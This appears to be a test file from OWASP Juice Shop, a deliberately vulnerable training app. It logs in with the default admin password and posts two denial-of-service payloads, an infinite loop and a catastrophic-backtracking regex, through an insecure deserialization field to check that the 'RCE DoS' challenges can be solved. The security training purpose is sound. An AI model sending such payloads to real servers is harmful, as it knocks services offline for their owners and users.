/*
 * Copyright (c) 2014-2021 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
import { browser } from 'protractor'
const utils = require('../../lib/utils')

describe('/b2b/v2/order', () => {
  protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "rce"', () => {
      it('an infinite loop deserialization payload should not bring down the server', () => {
        void browser.waitForAngularEnabled(false)
        browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 500) { console.log("Success"); }}; xhttp.open("POST","${browser.baseUrl}/b2b/v2/orders/", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",\`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"orderLinesData": "(function dos() { while(true); })()"}));`) // eslint-disable-line
        void browser.driver.sleep(1000)
        void browser.waitForAngularEnabled(true)
      })

      protractor.expect.challengeSolved({ challenge: 'Blocked RCE DoS' })
    })

    describe('challenge "rceOccupy"', () => {
      it('should be possible to cause request timeout using a recursive regular expression payload', () => {
        void browser.waitForAngularEnabled(false)
        browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 503) { console.log("Success"); }}; xhttp.open("POST","${browser.baseUrl}/b2b/v2/orders/", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",\`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"orderLinesData": "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"}));`) // eslint-disable-line
        void browser.driver.sleep(3000) // 2sec for the deserialization timeout plus 1sec for Angular
        void browser.waitForAngularEnabled(true)
      })

      protractor.expect.challengeSolved({ challenge: 'Successful RCE DoS' })
    })
  }
})
